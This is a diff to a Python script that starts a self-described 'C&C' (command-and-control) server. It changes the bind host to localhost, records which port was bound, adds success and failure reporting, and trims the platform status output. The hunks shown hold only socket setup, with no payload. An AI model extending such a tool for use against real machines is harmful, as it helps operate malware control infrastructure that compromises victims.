@@ -10,8 +10,9 @@ import binascii
 import time
 import datetime
 
-__server_host = "192.168.1.163"
+__server_host = "localhost"
 __server_ports = [x for x in range(3000, 3100)]  # change me
+__server_port = None
 
 ThreadCount = 0
 ServerSideSocket = None
@@ -35,18 +36,22 @@ def print_banner():
 
 
 def init_server():
+    global __server_port
     global ServerSideSocket
     ServerSideSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
+    status = False
     for port in __server_ports:
         print(f"Trying to initialize C&C server on  port {port}...")
         try:
             ServerSideSocket.bind((__server_host, port))
+            status = True
+            __server_port = port
             break
         except Exception as e:
             print(str(e))
+
     ServerSideSocket.listen(5)
-    return True
+    return status
 
 
 def handle_connections(ServerSideSocket: socket, active_sessions):
@@ -74,7 +79,7 @@ def dist():
 
 
 def print_status():
-    print(f'Number of threads: {ThreadCount}')
+    print(f'Running on port: {__server_port}')
     print("""Python version: %s
     dist: %s
     linux_distribution: %s
@@ -83,7 +88,6 @@ def print_status():
     platform: %s
     uname: %s
     version: %s
-    mac_ver: %s
     """ % (
         sys.version.split('\n'),
         str(dist()),
@@ -93,7 +97,6 @@ def print_status():
         platform.platform(),
         platform.uname(),
         platform.version(),
-        platform.mac_ver(),
     ))
 
 
@@ -195,9 +198,12 @@ if __name__ == '__main__':
     print_banner()
     print()
     try:
-        init_server()
-        if ServerSideSocket is not None:
+        status = init_server()
+        if status:
             print("Server initialized")
+        else:
+            print("Unable to init server. Error!")
+            exit()
     except Exception as e:
         print(str(e))
         print("Exiting...")
